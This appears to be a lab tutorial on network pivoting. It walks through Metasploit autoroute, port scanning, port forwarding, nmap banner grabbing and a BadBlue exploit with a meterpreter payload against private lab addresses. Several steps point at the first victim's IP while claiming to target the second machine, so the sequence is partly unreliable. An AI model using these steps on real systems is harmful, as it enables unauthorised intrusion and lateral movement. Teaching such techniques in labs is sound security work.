# Pivoting
Let's perform pivoting!
# Introduction of the Pivoting technique
Pivoting is a technique in cyber security that allows an attacker to move from one compromised system to another within a network. It simulates how a real attacker would try to access more valuable or vulnerable targets by using a foothold machine as a bridge. There are different types of pivoting, such as port forwarding, VPN pivoting, and SOCKS proxy pivoting12. Pivoting is also related to lateral movement, which involves privilege escalation on the same or different machines.

## Example of Pivoting <br>
We are in the DMZ, after obtain the initial access on a Target, we will use it to perform pivoting on the internal network.
Victim Machine 1 : 10.3.19.187 (first Target in the DMZ, where we are)
Victim Machine 2 : 10.3.17.176 (second Target in the internal network target reachable with Pivoting) <br>

Exploit the first Machine and got an initial access.
<img src="exploit1.png" width=70% height="auto"><br><br>
ipconfig:
<img src="ipconfig.png" width=70% height="auto"><br><br>
Execute the command: run autoroute -s 10.3.17.0/20
<img src="autoroute.png" width=70% height="auto"><br><br>
Use Metasploit post exploitation module for scanning the Target 2: 
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.3.19.187
set PORTS 1-100
exploit 
<img src="scanningtarget2.png" width=70% height="auto"><br><br>
Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap
portfwd add -l 1234 -p 80 -r 10.3.19.187
<img src="fwd.png" width=70% height="auto"><br><br>
nmap -sV -sS -p 1234 localhost (don't close Meta, use another terminal)
<img src="pwdnmap.png" width=70% height="auto"><br><br>
Successfull! We scanned the internal network Target!! Now we will exploit it with Metasploit.
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS 10.3.19.187
exploit
